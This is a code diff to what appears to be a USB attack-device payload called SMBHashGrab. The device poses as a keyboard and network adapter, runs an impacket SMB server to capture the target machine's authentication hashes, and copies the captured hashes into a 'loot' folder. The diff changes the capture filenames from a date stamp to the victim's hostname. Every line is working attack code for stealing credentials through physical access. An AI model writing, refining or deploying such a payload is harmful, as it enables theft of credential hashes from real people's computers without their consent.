@@ -20,9 +20,7 @@ LOOTDIR=/root/udisk/loot/SMBHashGrab
 SHAREDIR=/tmp/share
 SHARENAME=share
 HOST=\\\\172.16.64.1\\
-DATE=$(date +"%y_%d_%m_%H_%M_%S")
-#LOG=$LOOTDIR/$DATE.log
-
+#LOG=$LOOTDIR/$TARGET_HOSTNAME.log
 ######## SETUP STAGE ########
 REQUIRETOOL impacket
 LED SETUP
@@ -31,7 +29,9 @@ mkdir -p $SHAREDIR
 ######## ATTACK STAGE 1########
 LED STAGE1
 ATTACKMODE HID RNDIS_ETHERNET
-cd /tools/impacket/examples/ && python smbserver.py $SHARENAME $SHAREDIR >> $SHAREDIR/$DATE.txt &
+Q DELAY 150
+GET TARGET_HOSTNAME
+cd /tools/impacket/examples/ && python smbserver.py $SHARENAME $SHAREDIR >> $SHAREDIR/$TARGET_HOSTNAME.txt &
 Q DELAY 400
 
 ######## HID STAGE 2########
@@ -50,7 +50,7 @@ LED CLEANUP
 #If you are having trouble finding the lootdir, try uncommenting the next line
 #mount -o sync /dev/nandf /root/udisk
 mkdir -p $LOOTDIR
-grep -a :: $SHAREDIR/$DATE.txt >> $LOOTDIR/$DATE.txt
+grep -a :: $SHAREDIR/$TARGET_HOSTNAME.txt >> $LOOTDIR/$TARGET_HOSTNAME.txt
 disown
 rm -rf $SHAREDIR
 sync
